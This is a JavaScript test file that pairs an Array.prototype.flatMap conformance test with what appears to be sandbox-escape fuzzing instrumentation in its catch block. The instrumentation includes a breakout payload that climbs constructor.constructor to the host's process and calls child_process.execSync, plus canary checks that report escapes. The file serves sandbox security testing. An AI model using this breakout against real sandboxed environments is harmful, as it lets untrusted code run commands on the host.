try {
    function fn(e) {
        let REPLACER = 23;
        return e;
    }
    var obj1 = {
        length: 1,
        0: 'a',
        toString() {
            let REPLACER = 23;
            return 'obj1';
        }
    };
    var obj2 = new Int32Array(2);
    var obj3 = {
        get length() {
            throw () => {
                return () => {
                };
            };
            throw 'should not even consider the length property';
        },
        toString() {
            return 'obj3';
        }
    };
    var arr = [
        obj1,
        obj2,
        obj3
    ];
    var actual = arr.flatMap(fn);
    assert.compareArray(actual, arr, 'returns a similar array');
    assert.notSameValue(actual, arr, 'not the same array');
    var arrLike = {
        length: 4,
        0: obj1,
        1: obj2,
        2: obj3,
        get 3() {
            return arrLike;
        },
        toString() {
            return 'obj4';
        }
    };
    actual = [].flatMap.call(arrLike, fn);
    assert.compareArray(actual, [
        obj1,
        obj2,
        obj3,
        arrLike
    ], 'returns a similar array');
    assert.notSameValue(actual, arrLike, 'not the same object');
    assert.sameValue(Object.getPrototypeOf(actual), Array.prototype);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}